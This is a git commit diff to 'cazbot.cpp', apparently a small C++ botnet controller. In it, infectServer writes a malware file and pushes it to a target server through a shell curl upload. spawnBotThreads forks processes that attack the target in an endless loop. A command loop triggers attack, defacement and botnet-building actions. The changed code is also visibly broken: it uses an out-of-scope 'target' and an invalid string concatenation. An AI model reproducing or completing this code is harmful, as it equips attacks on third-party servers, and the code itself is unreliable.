49e027460598091c0ff0007fd62ad3b575727a85
cazzysoci <154034397+cazzysoci@users.noreply.github.com>
2023-12-18 16:22:06 +0800

    Update cazbot.cpp

--- cazbot.cpp
+++ cazbot.cpp
@@ -27,7 +27,7 @@ void infectServer(const std::string& target) {
                              std::istreambuf_iterator<char>());
 
     std::string command = "echo '" + malwareCode + "' > " + MALWARE_FILE_NAME;
-    command += " && curl -X POST -F 'file=@" + std::string(MALWARE_FILE_NAME) + "' " + target;
+    command += " && curl -X POST -F 'file=@" + MALWARE_FILE_NAME + "' " + target;
 
     system(command.c_str());
 }
@@ -55,17 +55,15 @@ void attackServer(const std::string& target) {
 }
 
 void spawnBotThreads(const std::string& target) {
-    srand(time(NULL));
-    while (true) {
-        pid_t pid = fork();
-        if (pid == 0) {
-            attackServer(target);
+    for (int i = 0; i < MAX_THREADS; ++i) {
+        if (fork() == 0) {
+            srand(time(NULL) ^ getpid());
+            while (true) {
+                attackServer(target);
+                sleep(rand() % 10 + 1);
+            }
             exit(0);
         }
-        else if (pid < 0) {
-            return;
-        }
-        sleep(rand() % 10 + 1);
     }
 }
 
@@ -82,56 +80,36 @@ void buildBotnet() {
     }
 }
 
-void executeCommand(const std::string& command, const std::string& target) {
+void executeCommand(const std::string& command) {
     if (command == "start") {
         spawnBotThreads(target);
-    }
-    else if (command == "deface") {
         infectServer(target);
-    }
-    else if (command == "buildBotnet") {
-        buildBotnet();
-    }
-    else if (command == "attackserver") {  // New command
+        std::cout << "Botnet has been started and the target has been infected.\n";
+    } else if (command == "deface") {
+        infectServer(target);
+        std::cout << "The target has been defaced.\n";
+    } else if (command == "attackserver") {
         attackServer(target);
-    }
-    else {
-        for (const auto& bot : bots) {
-            int sock;
-
-            if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-                return;
-            }
-
-            struct sockaddr_in botAddr;
-            botAddr.sin_family = AF_INET;
-            botAddr.sin_port = htons(bot.port);
-            botAddr.sin_addr.s_addr = inet_addr(bot.ip.c_str());
-
-            if (connect(sock, (struct sockaddr*)&botAddr, sizeof(botAddr)) < 0) {
-                close(sock);
-                return;
-            }
-
-            send(sock, command.c_str(), command.size(), 0);
-
-            close(sock);
-        }
+        std::cout << "The server is under attack.\n";
+    } else if (command == "buildbotnet") {
+        buildBotnet();
+        std::cout << "Botnet has been built.\n";
+    } else {
+        std::cout << "Invalid command.\n";
     }
 }
 
 int main() {
     std::string target = "www.target-website.com";
 
-    buildBotnet();
-    infectServer(target);
-
     while (true) {
         std::string command;
         std::cout << "Enter a command to execute on the botnet: ";
         std::getline(std::cin, command);
 
-        executeCommand(command, target);
+        executeCommand(command);
+
+        sleep(1);
     }
 
     return 0;
